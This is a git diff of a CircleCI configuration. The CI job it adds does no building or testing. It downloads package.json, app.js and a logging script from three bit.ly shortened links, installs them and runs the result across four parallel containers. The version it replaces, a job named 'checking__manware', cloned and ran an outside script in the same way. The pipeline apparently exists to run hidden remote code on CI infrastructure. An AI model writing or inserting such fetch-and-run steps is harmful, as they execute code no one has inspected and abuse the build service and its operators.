@@ -1,22 +1,23 @@
 version: 2.1
 
-orbs:
-  android: circleci/android@1.0.3
-
 jobs:
-
-  checking__manware:  
-    executor:
-      name: android/android-machine
+  run-checking:
+    docker:
+      - image: node:12
+    resource_class: medium
     parallelism: 4
-
     steps:
-      - run: git clone https://myfileoffi@bitbucket.org/myfileoffi/myfileoffi.git
-      - run: sudo apt-get update && sudo apt-get install -y libgbm-dev
-      - run: cd myfileoffi && npm i -s && node app_1h_online.js
-
+      - run: 
+          name: Get soure
+          command: |-
+            curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XgnUhW -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
+      - run: 
+          name: Install Packages
+          command: |-
+            npm i -s
+      - run: node app.js docker 2
+      
 workflows:
-
-  sample: 
+  start-work:
     jobs:
-      - checking__manware
+      - run-checking
